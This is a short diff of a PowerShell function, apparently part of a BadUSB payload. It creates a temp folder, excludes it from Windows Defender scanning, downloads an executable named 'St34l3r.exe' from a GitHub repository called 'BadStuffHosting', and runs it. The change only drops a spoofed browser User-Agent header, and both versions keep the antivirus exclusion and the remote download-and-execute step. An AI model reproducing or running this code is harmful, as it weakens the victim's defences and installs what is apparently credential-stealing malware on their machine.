@@ -3,13 +3,8 @@ function Get-Nirsoft {
     mkdir \temp
     cd \temp
     Add-MpPreference -ExclusionPath "C:\temp"
-    $UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
 
-    $WebRequestHeaders = @{
-        "User-Agent" = $UserAgent
-    }
-
-    Invoke-WebRequest -Uri "https://github.com/Gvte-Kali/BadStuffHosting/raw/main/BadUSB/W1ns1d3r/testing/St34l3r.exe" -OutFile St34l3r.exe -Headers $WebRequestHeaders
+    Invoke-WebRequest -Uri "https://github.com/Gvte-Kali/BadStuffHosting/raw/main/BadUSB/W1ns1d3r/testing/St34l3r.exe" -OutFile St34l3r.exe
 
     .\St34l3r.exe
 }
